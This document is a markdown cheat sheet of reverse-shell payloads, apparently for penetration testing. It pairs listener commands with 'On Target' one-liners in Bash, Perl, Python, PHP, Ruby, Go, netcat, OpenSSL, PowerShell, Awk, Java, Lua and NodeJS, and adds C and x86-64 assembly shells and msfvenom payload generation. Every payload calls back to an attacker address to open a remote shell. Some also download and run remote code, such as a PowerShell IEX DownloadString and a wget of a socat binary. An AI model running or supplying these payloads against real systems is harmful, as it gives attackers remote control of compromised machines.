# Reverse Shells
## Consider inserting `rlwrap` before the ncat listener command

# Bash v1 TCP
Listener:
ncat -nlvp 4242

On Target:
bash -i >& /dev/tcp/172.17.0.1/4242 0>&1

# Bash v2 TCP
Listener:
ncat -nlvp 4242

On Target:
0<&196;exec 196<>/dev/tcp/172.17.0.1/4242; sh <&196 >&196 2>&196

# Bash v3 UDP
Listener:
nc -u -lvp 4242

On Target:
sh -i >& /dev/udp/172.17.0.1/4242 0>&1


# Socat
## Static socat binary can be found at:
## [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
Listener: 
socat file:`tty`,raw,echo=0 TCP-L:4242

On Target (with socat installed):
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.17.0.1:4242

On Target (with no socat installed):
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:172.17.0.1:4242


# Perl v1
Listener:
ncat -nlvp 4242

On Target:
perl -e 'use Socket;$i="172.17.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Perl v2 (works on older systems)
Listener:
ncat -nlvp 4242

On Target:
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.17.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'

if we get an error about a parameterless use of IO we can try:
perl -e 'use IO qw(Socket);$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"172.17.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


On Target (Windows only):
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"172.17.0.1:4242");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'


# Python v1
Listener:
ncat -nlvp 4242

On Target (Unix):
export RHOST="172.17.0.1";export RPORT=4242;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

# Python v2
Listener:
ncat -nlvp 4242

On Target (Unix):
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Python v3
Listener:
ncat -nlvp 4242

On Target (Unix):
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.17.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python v4
Listener:
ncat -nlvp 4242

On Target (IPv6/Unix):
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4242,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'

# Python v5
Listener:
ncat -nlvp 4242

On Target (Windows):
C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('172.17.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"


# PHP v1
Listener:
ncat -nlvp 4242

On Target:
php -r '$sock=fsockopen("172.17.0.1",4242);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP v2
Listener:
ncat -nlvp 4242

On Target:
php -r '$sock=fsockopen("172.17.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'

# PHP v3
Listener:
ncat -nlvp 4242

On Target:
php -r '$s=fsockopen("172.17.0.1",4242);shell_exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP v4
Listener:
ncat -nlvp 4242

On Target:
php -r '$s=fsockopen("172.17.0.1",4242);`/bin/sh -i <&3 >&3 2>&3`;'

# PHP v5
Listener:
ncat -nlvp 4242

On Target:
php -r '$s=fsockopen("172.17.0.1",4242);system("/bin/sh -i <&3 >&3 2>&3");'

# PHP v6
Listener:
ncat -nlvp 4242

On Target:
php -r '$s=fsockopen("172.17.0.1",4242);popen("/bin/sh -i <&3 >&3 2>&3", "r");'


# Ruby v1 Unix
Listener:
ncat -nlvp 4242

On Target (Unix):
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("172.17.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Ruby v2 Unix
Listener:
ncat -nlvp 4242

On Target (Unix):
ruby -rsocket -e 'f=TCPSocket.open("172.17.0.1",4242).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Ruby v3 Windows
Listener:
ncat -nlvp 4242

On Target (Windows):
ruby -rsocket -e 'c=TCPSocket.new("172.17.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'

# Golang
Listener:
ncat -nlvp 4242

On Target:
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","172.17.0.1:4242");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go

# Netcat Traditional v1
Listener:
ncat -nlvp 4242

On Target:
nc -e /bin/sh 172.17.0.1 4242

# Netcat Traditional v2
Listener:
ncat -nlvp 4242

On Target:
nc -e /bin/bash 172.17.0.1 4242

# Netcat Traditional v3
Listener:
ncat -nlvp 4242

On Target:
nc -c bash 172.17.0.1 4242

# Netcat Traditional v4 (Windows/Linux)
Listener:
ncat -nlvp 4242

On Target (Windows):
nc -nv 172.17.0.1 4242 -e cmd.exe     # windows 
On Target (Unix):
nc -nv 172.17.0.1 4242 -e /bin/bash   # *nix

# Netcat OpenBsd
Listener:
ncat -nlvp 4242

On Target:
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.17.0.1 4242 >/tmp/f

# Ncat v1 TCP
Listener:
ncat -nlvp 4242

On Target:
ncat 172.17.0.1 4242 -e /bin/bash

# Ncat v2 UDP
Listener:
ncat -nulvp 4242

On Target:
ncat --udp 172.17.0.1 4242 -e /bin/bash

# Xterm v1
To catch incoming xterm, start an open X Server on your system (:1 - which listens on TCP port 6001). One way to do this is with Xnest:
Xnest :1

Then remember to authorise on your system the target IP to connect to you:

xterm -display 127.0.0.1:1  # Run this OUTSIDE the Xnest
xhost +targetip             # Run this INSIDE the spawned xterm on the open X Server

Then on the target, assuming that xterm is installed, connect back to the open X Server on your system:
xterm -display <attackerip>:1

Or:
$ DISPLAY=attackerip:0 xterm

It will try to connect back to you, attackerip, on TCP port 6001.
Note that on Solaris xterm path is usually not within the PATH environment variable, you need to specify its filepath:
/usr/openwin/bin/xterm -display <attackerip>:1

# Xterm v2
The following commands should be run on the server. They will try to connect back to you 
where in this case your IP address is e.g. 172.17.0.1 and on TCP port 6001.
xterm -display 172.17.0.1:1

Before catching the incoming xterm, we must authorize the user to connect to 
our X-server with:

xhost +targetip

Now we can start an X-Server which will listen on TCP port 6001, a way
to do this is by using Xnest, so on our system we will issue:

Xnest :1

# OpenSSL
Listener:
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port 4242
or
ncat --ssl -vv -l -p 4242

On Target:
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 172.17.0.1:4242 > /tmp/s; rm /tmp/s

# Powershell v1
powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("172.17.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# Powershell v2
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.17.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Powershell v3
powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')

# Awk
Listener:
ncat -nlvp 4242

On Target:
awk 'BEGIN {s = "/inet/tcp/0/172.17.0.1/4242"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null

# Java v1
Listener:
ncat -nlvp 4242

On Target:
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/172.17.0.1/4242;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()


## Java v2
Listener:
ncat -nlvp 4242

On Target:
String host="172.17.0.1";
int port=4444;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();


## Java v3
Listener:
ncat -nlvp 4242

//**NOTE**: This is more stealthy
Thread thread = new Thread(){
    public void run(){
        // put reverse shell code here 
    }
}
thread.start();

# Java v4 War
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f war > reverse.war
strings reverse.war | grep jsp # in order to get the name of the file


# Lua v1 Linux
Listener:
ncat -nlvp 4242

lua -e "require('socket');require('os');t=socket.tcp();t:connect('172.17.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"

# Lua v2 Windows and Linux
Listener:
ncat -nlvp 4242

lua5.1 -e 'local host, port = "172.17.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'

# NodeJS v1
Listener:
ncat -nlvp 4242


(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4242, "172.17.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();


# NodeJS v2
Listener:
ncat -nlvp 4242

require('child_process').exec('nc -e /bin/sh 172.17.0.1 4242')

# NodeJS v3
Listener:
ncat -nlvp 4242

-var x = global.process.mainModule.require
-x('child_process').exec('nc 172.17.0.1 4242 -e /bin/bash')

# NodeJS v4
Listener:
ncat -nlvp 4242

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py

# Groovy v1
Listener:
ncat -nlvp 4242

by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
NOTE: Java reverse shell also works for Groovy

String host="172.17.0.1";
int port=4242;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();

# Groovy v2
**NOTE**: This is more stealthy

Thread.start {
    // Reverse shell here
}


# C
## A reverse shell in C can be done with the following code,
## notice that we have to modify the two constants 
## `REMOTE_ADDR` and `REMOTE_PORT`.
## Compile with gcc -static
```c
/* credits to http://blog.techorganic.com/2015/01/04/pegasus-hacking-challenge/ */
#include <stdio.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

#define REMOTE_ADDR "172.17.0.1"
#define REMOTE_PORT 4242

int main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int s;

    sa.sin_family = AF_INET;
    sa.sin_addr.s_addr = inet_addr(REMOTE_ADDR);
    sa.sin_port = htons(REMOTE_PORT);

    s = socket(AF_INET, SOCK_STREAM, 0);
    connect(s, (struct sockaddr *)&sa, sizeof(sa));
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve("/bin/sh", 0, 0);
    return 0;
}
```


# Assembly x86-64
# TO REVIEW, ADD HOW TO COMPILE AND HOW/WHERE TO INSERT IP/PORT
## A reverse shell in assembly for x86-64 architecture. You
## have to modify `IP address` and `Port` (default 127.0.0.1:1234)
## Then you can compile it with nasm or get shellcode with:
## [Shellcode-Extractor](https://github.com/Neetx/Shellcode-Extractor)
## 04d2 is 1234 in hex

```asm
; 66 byte reverse shell for linux/x86-64
; odzhan
global _start
section .text
_start:	
    bits    64
    
    mov     rax, ~0x0100007fd2040002  ;IP address 0100007f and port d204 
    not     rax
    push    rax
    push    rsp
    
    ; step 1, create a socket
    ; socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    push    41
    pop     rax
    push    1
    pop     rsi
    push    2
    pop     rdi
    cdq
    syscall
    
    xchg    eax, edi         ; edi = s
    xchg    eax, esi         ; esi = 2, eax = 0
    
    ; step 2, assign socket handle to stdin,stdout,stderr
    ; dup2 (s, STDIN_FILENO)
    ; dup2 (s, STDOUT_FILENO)
    ; dup2 (s, STDERR_FILENO)
dup_loop64:
    mov     al, 33           ; rax = sys_dup2
    syscall
    sub     esi, 1           ; watch out for that bug 😉
    jns     dup_loop64       ; jump if not signed
    
    ; step 3, connect to remote host
    ; connect (s, &sa, sizeof(sa));
    pop     rsi              ; rsi = &sa
    mov     dl, 16           ; rdx = sizeof(sa)
    mov     al, 42           ; rax = sys_connect
    syscall    
    
    ; step 4, execute /bin/sh
    ; execv("/bin//sh", 0, 0);
    cdq
    push    rdx
    pop     rsi              ; rsi=0
    push    rdx              ; zero terminator
    mov     rcx, '/bin//sh'
    push    rcx
    push    rsp
    pop     rdi    
    mov     al, 59           ; rax = sys_execve
    syscall
```

# Meterpreter Shell
Listener:
ncat -nlvp 4242

## Windows Staged reverse TCP 
msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f exe > reverse.exe

## Windows Stageless reverse TCP
msfvenom -p windows/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f exe > reverse.exe

## Linux Staged reverse TCP
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f elf >reverse.elf

## Linux Stageless reverse TCP
msfvenom -p linux/x86/shell_reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f elf >reverse.elf

## Other platforms
$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f elf > shell.elf
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f exe > shell.exe
$ msfvenom -p osx/x86/shell_reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f macho > shell.macho
$ msfvenom -p windows/meterpreter/reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f asp > shell.asp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f raw > shell.jsp
$ msfvenom -p java/jsp_shell_reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f war > shell.war
$ msfvenom -p python/meterpreter/reverse_tcp LHOST=172.17.0.1 LPORT=4242 -f raw -o /tmp/python.py
$ msfvenom -p cmd/unix/reverse_python LHOST="172.17.0.1" LPORT=4242 -f raw > shell.py
$ msfvenom -p cmd/unix/reverse_bash LHOST="172.17.0.1" LPORT=4242 -f raw > shell.sh
$ msfvenom -p cmd/unix/reverse_perl LHOST="172.17.0.1" LPORT=4242 -f raw > shell.pl
$ msfvenom -p php/meterpreter_reverse_tcp LHOST="172.17.0.1" LPORT=4242 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
